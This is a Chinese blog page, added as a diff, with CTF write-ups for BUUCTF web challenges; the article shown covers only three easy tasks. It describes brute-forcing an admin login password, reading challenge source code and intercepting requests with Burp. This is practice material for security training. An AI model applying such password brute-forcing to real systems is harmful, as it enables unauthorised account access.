@@ -1,0 +1,1553 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+<script>
+    (function () {
+        if ('') {
+            if (prompt('请输入文章密码') !== '') {
+                alert('密码错误！');
+                if (history.length === 1) {
+                    location.replace("https://evenyao.com"); // 这里替换成你的首页
+                } else {
+                    history.back();
+                }
+            }
+        }
+    })();
+</script>
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/zx.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/zx.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/zx.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="[HCTF 2018]admin一个登陆框，登录名应该是admin，直接爆破密码爆破后为123登陆成功，拿到flag [极客大挑战 2019]Havefunf12查看源码 12345$cat&#x3D;$_GET[&#39;cat&#39;];echo $cat;if($cat&#x3D;&#x3D;&#39;dog&#39;)&amp;#123;    echo &#39;Syc&amp;#123;cat_cat_cat_cat&amp;#125;&#39;;&amp;#125; 开始以为echo出的就">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF-Web">
+<meta property="og:url" content="http://www.zxfireworks.xyz/post/e9141edc.html">
+<meta property="og:site_name" content="w1ndy">
+<meta property="og:description" content="[HCTF 2018]admin一个登陆框，登录名应该是admin，直接爆破密码爆破后为123登陆成功，拿到flag [极客大挑战 2019]Havefunf12查看源码 12345$cat&#x3D;$_GET[&#39;cat&#39;];echo $cat;if($cat&#x3D;&#x3D;&#39;dog&#39;)&amp;#123;    echo &#39;Syc&amp;#123;cat_cat_cat_cat&amp;#125;&#39;;&amp;#125; 开始以为echo出的就">
+<meta property="og:image" content="http://q63cs67co.bkt.clouddn.com/buuctf_login_1.PNG">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/SecretFile/secretfile_0.PNG">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/SecretFile/secretfile_1.PNG">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/SecretFile/secretfile_2.PNG">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/SecretFile/secretfile_3.PNG">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/SecretFile/secretfile_4.PNG">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/SecretFile/secretfile_5.PNG">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Knife/Knife_0.PNG">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Knife/Knife_1.PNG">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Http/Http_0.PNG">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Http/Http_1.PNG">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Http/Http_2.PNG">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Http/Http_3.PNG">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Include/Include_0.PNG">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Include/Include_1.PNG">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/GXYCTF2019_REC/rce.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce2.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce3.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce4.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce5.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/easy_serialize_php/easy_serialize_php0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_sql/easy_sql0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_sql/easysql1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_sql/easysql2.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_sql/easysql3.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/Easysql/Easysql0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/Easysql/Easysql1.png">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/Easysql/Easysql2.png">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql2.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql3.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql4.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql5.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql6.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql7.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/hacker/hacker0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/hacker/hacker1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/hacker/hacker2.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/OnlineTool/onlineTool0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/OnlineTool/onlineTool1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/EasyCalc/calc0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/EasyCalc/calc1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/EasyCalc/calc2.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/EasyCalc/calc3.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/buyflag/buyflag0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/buyflag/buyflag1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/buyflag/buyflag2.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/buyflag/buyflag3.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/buyflag/buyflag4.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql2.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql3.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql4.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql5.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql6.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql7.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql8.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql9.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Upload/upload0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Upload/upload1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/ACTF_Upload/upload_0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/CVE-2020-7066/cve20207066_0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/CVE-2020-7066/cve20207066_1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/CVE-2020-7066/cve20207066_2.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/CVE-2020-7066/cve20207066_3.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/CVE-2020-7066/cve20207066_4.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/GKCTF2020_CheckIN/checkin_0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/GKCTF2020_CheckIN/checkin_1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/GKCTF2020_CheckIN/checkin_2.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/easy_web/easyweb0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/easy_web/easyweb1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/easy_web/easyweb2.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/easy_web/easyweb3.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Unicornshop/Unicornshop1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Unicornshop/Unicornshop0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Unicornshop/Unicornshop2.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Unicornshop/Unicornshop3.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Unicornshop/Unicornshop4.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Unicornshop/Unicornshop5.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Themysteryofip/ip0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Themysteryofip/ip1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Themysteryofip/ip2.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Themysteryofip/ip3.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Themysteryofip/ip4.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Themysteryofip/ip5.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/ZJCTFbgrc/ZGCTFbgrc0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/ZJCTFbgrc/ZGCTFbgrc1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/ZJCTFbgrc/ZGCTFbgrc2.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Cookieissostable/Cookieissostable0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Cookieissostable/Cookieissostable1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Cookieissostable/Cookieissostable3.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Cookieissostable/Cookieissostable2.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Cookieissostable/Cookieissostable4.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Ez_bypass/easy_bypass.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/BabyUpload/BabyUpload0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/BabyUpload/BabyUpload1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/BabyUpload/BabyUpload2.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/BabyUpload/BabyUpload3.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/BabyUpload/BabyUpload4.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/YouSendYouMa/yousend0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/YouSendYouMa/yousend1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/YouSendYouMa/yousend2.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpweb/phpweb0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpweb/phpweb1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpweb/phpweb2.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpweb/phpweb3.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpweb/phpweb4.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpweb/phpweb5.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpweb/phpweb6.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/FakeXMLcookbook/Fakecookbook0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/FakeXMLcookbook/Fakecookbook1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger2.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger3.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger4.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger5.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger6.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger7.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger8.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/duangShell/duanShell0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/duangShell/duanShell1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/duangShell/duanShell2.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/duangShell/duanShell3.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/PYWebsite/PYWebsite0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/PYWebsite/PYWebsite1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/PYWebsite/PYWebsite2.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/PYWebsite/PYWebsite3.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/elementmaster/elementmaster0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/elementmaster/elementmaster1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/elementmaster/elementmaster2.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/elementmaster/elementmaster3.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/RCEME/RCEME0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/RCEME/RCEME1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/RCEME/RCEME2.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Nmap/nmap0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Nmap/nmap1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Nmap/nmap2.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/ReadlezPHP/ReadlezPHP0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/ReadlezPHP/ReadlezPHP1.jpg">
+<meta property="article:published_time" content="2020-03-14T09:13:19.000Z">
+<meta property="article:modified_time" content="2020-11-22T13:22:18.061Z">
+<meta property="article:author" content="w1ndy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://q63cs67co.bkt.clouddn.com/buuctf_login_1.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.zxfireworks.xyz/post/e9141edc.html"/>
+
+
+
+
+
+  <title>BUUCTF-Web | w1ndy</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">w1ndy</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+<!-- Global APlayer -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script>
+<meting-js
+  auto="https://music.163.com/#/my/m/music/playlist?id=5013733903"
+  list-folded="true"
+  fixed="true"
+  lrc-type="0">
+</meting-js>
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.zxfireworks.xyz/post/e9141edc.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="w1ndy">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="w1ndy">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">BUUCTF-Web</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-14T17:13:19+08:00">
+                2020-03-14
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2020-11-22T21:22:18+08:00">
+                2020-11-22
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF-Web/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF-Web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/post/e9141edc.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/post/e9141edc.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h3><p><img src="http://q63cs67co.bkt.clouddn.com/buuctf_login_1.PNG" alt=""><br>一个登陆框，登录名应该是admin，直接爆破<br>密码爆破后为123<br>登陆成功，拿到flag</p>
+<h3 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h3><p>f12查看源码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cat</span>=<span class="variable">$_GET</span>[<span class="string">'cat'</span>];</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$cat</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$cat</span>==<span class="string">'dog'</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>开始以为echo出的就是flag,结果不是<br>那就传入参数?cat=dog,flag就出来了</p>
+<h3 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h3><p>在源码中发现<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/SecretFile/secretfile_0.PNG" alt=""><br>点进去后<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/SecretFile/secretfile_1.PNG" alt=""><br>进入链接后<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/SecretFile/secretfile_2.PNG" alt=""><br>用burp抓包<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/SecretFile/secretfile_3.PNG" alt=""><br>访问secr3t.php</p>
